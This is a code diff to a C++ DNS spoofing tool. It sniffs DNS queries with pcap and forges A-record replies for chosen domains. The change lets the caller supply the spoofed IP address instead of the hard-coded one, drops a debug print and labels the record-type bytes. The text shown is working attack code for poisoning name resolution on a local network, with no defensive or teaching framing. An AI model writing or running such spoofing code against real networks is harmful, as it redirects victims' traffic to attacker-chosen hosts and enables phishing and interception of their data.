@@ -13,12 +13,15 @@ using std::string;
 DnsSpoofer::DnsSpoofer() = default;
 vector<std::string> spoof_domain_segments;
 char spoof_domain_name[1024];
+uint8_t* ip;
+
 
 void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);
 vector<string> get_domain_name(const unsigned char *query_payload);
 
-void DnsSpoofer::start_spoofing(char *device, const vector<std::string> &inputDomain) {
+void DnsSpoofer::start_spoofing(char *device, const vector<std::string> &inputDomain, uint8_t *inputIp) {
     spoof_domain_segments = inputDomain;
+    ip = inputIp;
 
     for(auto & segment : inputDomain) {
         char tmp[1024] = "";
@@ -68,7 +71,6 @@ vector<string> get_domain_name(const unsigned char *query_payload) {
 void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
 
     vector<string> spoof_target = spoof_domain_segments;
-    cout << spoof_target[0] << endl;
 
     auto incoming_ethernet_header = (struct ethhdr *) bytes;
     auto incoming_ip_header = (struct iphdr*)(bytes + sizeof(struct ethhdr));
@@ -116,17 +118,15 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                         "%s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
                         spoof_domain_name,
                         0x00,
-                        0x00,
-                        0x01,
-                        0x00,
-                        0x01,
+                        0x00, 0x01, // A
+                        0x00, 0x01, // IN
                         //answer
                         0xc0, 0x0c, //idk
                         0x00, 0x01, // A
                         0x00, 0x01, // IN
                         0x00, 0x00, 0x00, 0x11, // 17 time to live: );
                         0x00, 0x04, //data length 4
-                        0xbc, 0xa5, 0xe9, 0x14 // yafud.pl
+                        ip[0], ip[1], ip[2], ip[3] // yafud.pl
                 );
 
                 cout << "PayloadS" << payload_s << endl;
